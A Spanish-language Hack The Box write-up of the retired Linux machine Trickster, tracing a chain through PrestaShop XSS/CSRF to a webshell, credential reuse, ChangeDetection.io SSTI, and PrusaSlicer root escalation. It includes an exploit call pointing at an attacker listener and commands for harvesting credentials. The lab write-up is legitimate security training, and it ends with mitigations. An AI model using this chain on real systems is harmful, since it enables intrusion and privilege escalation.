---
machine: Trickster
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, prestashop, xss, changedetection, ssti, prusaslicer, cve-2024-34716, privesc]
---

# Trickster — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

PrestaShop es vulnerable a CVE-2024-34716: un XSS en el checkout permite ejecutar un CSRF contra el admin y subir un tema con un webshell, lo que da `www-data`. Las credenciales de la base llevan a `james`; desde ahí se alcanza ChangeDetection.io, vulnerable a SSTI (CVE-2024-32651), y se obtiene root en el contenedor. Una contraseña en los datos del contenedor permite `adam` en el host, y PrusaSlicer como root ejecuta un script de post-procesado (CVE-2023-47268).

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` Apache con PrestaShop 8.
- `ffuf` descubre `trickster.htb` y `admin.trickster.htb`.
- ModSecurity bloquea algunas herramientas por User-Agent.

## Enumeración

- `git-dumper` recupera el código fuente y confirma la versión de PrestaShop.
- La tienda es vulnerable a CVE-2024-34716: XSS en el campo de dirección del checkout.
- El XSS ejecuta un CSRF contra el admin, obtiene los tokens y sube un tema con un webshell.

## Foothold

Se envía el payload a un administrador y se obtiene ejecución como `www-data` al visitar el tema.

```bash
python3 CVE-2024-34716.py -u http://trickster.htb -l <ATTACKER> -p 443
```

## Movimiento lateral

`parameters.php` contiene las credenciales de MySQL. La contraseña de la base también funciona para `james` por SSH.

```bash
grep -R "database_password" prestashop/app/config/parameters.php
ssh james@trickster.htb
```

## Escalada de privilegios

En Docker, ChangeDetection.io 0.45.20 escucha en `172.17.0.2:5000`. Es vulnerable a CVE-2024-32651: una notificación con Jinja2 ejecuta comandos y da root en el contenedor. En `/datastore` hay una contraseña que funciona para `adam` en el host. `adam` puede ejecutar `/opt/PrusaSlicer/prusaslicer` como root; un `.3mf` con un script de post-procesado ejecuta código como root.

```bash
curl -s http://172.17.0.2:5000
sudo /opt/PrusaSlicer/prusaslicer -s malicious.3mf
```

## Evidencia

- PrestaShop y CVE-2024-34716.
- Tema con webshell y `www-data`.
- Credenciales de base y `james`.
- ChangeDetection SSTI y root en contenedor.
- `adam`, PrusaSlicer y CVE-2023-47268.

## Lecciones aprendidas

- Un XSS en checkout puede encadenar CSRF y subida de temas.
- Las credenciales de base se reutilizan en SSH.
- ChangeDetection.io con notificaciones Jinja2 es SSTI.
- Un slicer que ejecuta scripts de post-procesado es ejecución como root.

## Mitigación y detección

- Actualizar PrestaShop y validar el checkout.
- Separar credenciales de base y sistema.
- Actualizar ChangeDetection.io y deshabilitar plantillas no confiables.
- No ejecutar PrusaSlicer como root; deshabilitar scripts de post-procesado.

## Referencias

- [0xdf — Trickster](https://0xdf.gitlab.io/2025/02/01/htb-trickster.html)
- [IppSec — Trickster](https://www.youtube.com/watch?v=eDhsfl_GYQQ)
- [Hack The Box — Trickster](https://app.hackthebox.com/machines/trickster)
